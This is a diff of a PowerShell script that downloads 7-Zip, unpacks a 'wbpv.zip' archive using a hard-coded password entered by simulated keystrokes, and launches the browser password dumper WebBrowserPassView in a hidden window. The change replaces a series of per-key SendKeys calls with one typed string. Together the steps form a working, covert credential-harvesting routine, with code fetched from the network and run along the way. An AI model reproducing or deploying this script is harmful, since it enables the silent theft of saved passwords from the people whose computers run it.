@@ -13,17 +13,17 @@ Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7za920.zip' -OutFile '7z.zip'
 Expand-Archive '7z.zip'
 & '.\7z\7za.exe' e 'wbpv.zip'
 
-[System.Windows.Forms.SendKeys]::SendWait('^w')
-[System.Windows.Forms.SendKeys]::SendWait('^b')
-[System.Windows.Forms.SendKeys]::SendWait('^p')
-[System.Windows.Forms.SendKeys]::SendWait('^v')
-[System.Windows.Forms.SendKeys]::SendWait('^2')
-[System.Windows.Forms.SendKeys]::SendWait('^8')
-[System.Windows.Forms.SendKeys]::SendWait('^8')
-[System.Windows.Forms.SendKeys]::SendWait('^2')
-[System.Windows.Forms.SendKeys]::SendWait('^1')
-[System.Windows.Forms.SendKeys]::SendWait('^@')
+# Load the necessary assembly
+Add-Type -AssemblyName System.Windows.Forms
 
+# Define the word you want to type
+$wordToType = "wbpv28821@"
+
+# Type the word
+[System.Windows.Forms.SendKeys]::SendWait($wordToType)
+
+# Simulate pressing the Enter key
+[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 
 Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden
 
